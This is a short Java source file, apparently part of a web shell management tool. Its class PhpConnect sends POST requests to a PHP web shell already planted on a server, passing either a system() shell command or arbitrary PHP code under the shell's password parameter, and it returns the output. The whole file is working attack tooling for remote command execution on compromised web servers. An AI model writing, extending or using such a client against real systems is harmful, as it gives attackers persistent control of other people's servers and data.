package com.atlant1c.connect;

import com.atlant1c.utils.HttpUtils;
import java.util.HashMap;
import java.util.Map;

public class PhpConnect {

    public static String executeCommand(String url, String pass, String command) {
        try {
            // Prepare the URL parameters and headers
            String urlParameters = pass + "=system(\"" + command + "\");";
            Map<String, String> headers = new HashMap<>();
            String response = HttpUtils.sendPostRequest(url, urlParameters, headers);

            // Return the response content
            return response;
        } catch (Exception e) {
            e.printStackTrace();
            return "命令执行失败";
        }
    }

    public static String executePhp(String url,String pass, String code){
        try {
            String urlParameters = pass + "=" + code ;
            Map<String, String> headers = new HashMap<>();
            String response = HttpUtils.sendPostRequest(url, urlParameters, headers);
            return response;
        } catch (Exception e) {
            e.printStackTrace();
            return "代码执行失败";
        }
    }
}
